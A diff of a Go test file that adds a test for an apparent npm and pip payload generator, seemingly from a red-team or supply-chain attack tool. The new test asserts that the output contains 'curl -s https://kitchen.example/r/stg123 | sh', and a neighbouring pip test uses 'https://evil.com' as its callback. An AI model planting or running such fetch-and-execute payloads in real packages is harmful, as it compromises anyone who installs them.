@@ -118,6 +118,16 @@ func TestNPMPayload_PreserveFlow(t *testing.T) {
 	assert.Contains(t, payloads[0].Content, "|| true")
 }
 
+func TestNPMPayload_CallbackURLUsesExactPath(t *testing.T) {
+	payload := NewNPMPayload(PayloadOptions{
+		CallbackURL: "https://kitchen.example/r/stg123",
+	})
+	payloads := payload.Generate()
+
+	require.NotEmpty(t, payloads)
+	assert.Contains(t, payloads[0].Content, "curl -s https://kitchen.example/r/stg123 | sh")
+}
+
 func TestPipPayload_WithCallbackURL(t *testing.T) {
 	payload := NewPipPayload(PayloadOptions{
 		CallbackURL: "https://evil.com",
